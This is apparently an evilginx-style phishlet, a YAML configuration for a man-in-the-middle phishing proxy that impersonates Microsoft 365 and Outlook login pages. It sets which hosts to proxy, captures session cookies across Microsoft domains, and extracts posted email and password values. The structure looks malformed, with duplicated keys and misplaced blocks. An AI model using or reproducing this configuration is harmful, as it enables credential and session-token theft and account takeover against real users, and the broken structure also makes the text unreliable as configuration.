min_ver: '3.2.0'
proxy_hosts:
  - plugin_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true
  - plugin_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false
  - plugin_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false
subfilters:
  - search: '(.*?)\.microsoftonline\.com'
    replace: '$1.login.microsoftonline.com'
    auth_tokens:
      domain: '.live.com'
      keys: ['.*regexp.*']
      domain: 'live.com'
      keys: ['.*regexp.*']
      domain: '.login.live.com'
      keys: ['.*regexp.*']
      domain: 'login.live.com'
      keys: ['.*regexp.*']
      domain: '.login.microsoftonline.com'
      keys: ['.*regexp.*']
      domain: 'login.microsoftonline.com'
      keys: ['.*regexp.*']
      domain: '.microsoft.com'
      keys: ['.*regexp.*']
      domain: 'microsoft.com'
      keys: ['.*regexp.*']
      domain: '.office.com'
      keys: ['.*regexp.*']
      domain: 'office.com'
      keys: ['.*regexp.*']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
